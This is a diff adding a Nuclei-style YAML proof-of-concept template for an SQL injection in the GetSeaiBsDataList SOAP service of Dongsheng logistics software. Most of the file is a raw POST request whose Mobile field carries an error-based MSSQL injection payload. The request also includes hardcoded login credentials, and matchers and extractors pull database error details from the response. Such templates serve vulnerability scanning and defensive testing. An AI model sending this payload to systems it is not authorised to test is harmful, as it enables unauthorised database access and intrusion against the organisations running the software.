@@ -1,0 +1,55 @@
+id: poc-yaml-dongshengsoft-getseaibsdatalist-sqli
+info:
+  name: 东胜物流软件 GetSeaiBsDataList SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+variables:
+  t1: "{{rand_int(1000,9999)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - raw:
+      - |
+        POST /Webservice/DsWebService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/soap+xml;charset=UTF-8;action="DsWebService/GetSeaiBsDataList"
+
+        <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:dsw="DsWebService">
+           <soap:Header/>
+           <soap:Body>
+              <dsw:GetSeaiBsDataList>
+                 <dsw:LoginName>qdtaize</dsw:LoginName>
+                 <dsw:LoginPass>EBBE3242-D49E-4398-BBFE-0133CA655EB5</dsw:LoginPass>
+                 <dsw:Mobile>1')or 1&lt;sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--</dsw:Mobile>
+                 <dsw:Mblno>1</dsw:Mblno>
+                 <dsw:start>1</dsw:start>
+                 <dsw:limit>1</dsw:limit>
+              </dsw:GetSeaiBsDataList>
+           </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "0x{{t2}}"
+          - "SqlException"
+        part: body
+      - type: regex
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
+        part: body
+      - type: word
+        words:
+          - "application/soap+xml"
+        part: header
+    extractors:
+      - type: regex
+        name: error_details
+        part: body
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
